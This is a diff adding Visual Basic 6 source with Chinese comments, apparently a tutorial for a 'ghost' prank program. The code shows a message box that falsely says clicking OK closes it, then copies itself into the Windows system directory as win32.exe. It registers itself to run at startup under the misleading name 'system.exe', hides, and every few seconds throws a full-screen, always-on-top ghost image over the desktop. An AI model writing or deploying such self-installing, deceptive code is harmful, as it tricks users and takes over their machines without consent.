@@ -1,0 +1,66 @@
+Option Explicit
+Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
+Dim i As Integer        '计数器变量
+
+Private Sub Form_Load()
+        Dim syspath As String     '保存系统路径
+        Dim strpath As String     '保存文件所在路径
+        Dim wshshell As Object
+        Set wshshell = CreateObject("wscript.shell")
+        
+        '获得系统路径
+        syspath = Space(256)
+        GetSystemDirectory syspath, 256
+        syspath = Trim(syspath)
+        syspath = Left(syspath, Len(syspath) - 1)
+        
+        '获得文件所在路径
+        strpath = IIf(Right(App.Path, 1) = "\", App.Path, App.Path & "\") & App.EXEName & ".exe"
+        
+        If Dir(syspath & "\win.dat") = "" Then
+                '在系统目录下建一个win.dat的文件，下次随机启动时，不会出现鬼故事的对话框
+                Open syspath & "\win.dat" For Output As #1
+                        Print #1, "女鬼到此一游！"
+                Close #1
+                MsgBox "鬼故事的内容", , "鬼故事"          '这里放一段吓人的鬼故事
+                MsgBox "很害怕吧！点确定关闭该程序", , "鬼故事"               '用这个迷惑别人，以为真的关闭了
+               
+                '复制到系统目录下
+                FileCopy strpath, syspath & "\win32.exe"
+               
+                '添加到注册表的启动里
+                wshshell.regwrite "HKLM\software\microsoft\windows\currentversion\run\system.exe", syspath & "\win32.exe"
+        End If
+        
+        Form1.Visible = False    '窗体是隐藏的
+        
+        Timer1.Interval = 1000   '1秒钟1次
+        Timer1.Enabled = True
+End Sub
+
+Private Sub Timer1_Timer()
+        i = i + 1
+        If i = 5 Then     '在后台等待5秒钟
+                Form2.Show
+                i = 0
+                Timer1.Interval = 0    '是timer1失效
+        End If
+End Sub
+
+form1一直在后台等待，每到5秒，就让form2显示一次，form2上有我们可爱的女鬼的图片，就是让她出来吓人！看form2的代码：
+
+Option Explicit
+Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
+
+Private Sub Form_Load()
+        SetWindowPos Form2.hwnd, -1, 0, 0, Screen.Width, Screen.Height, 0   '将窗口设为总在最前
+
+        Timer1.Interval = 1000
+        Timer1.Enabled = True
+End Sub
+
+Private Sub Timer1_Timer()
+        Form1.Timer1.Interval = 1000
+        Timer1.Enabled = False
+        Unload Form2
+End Sub
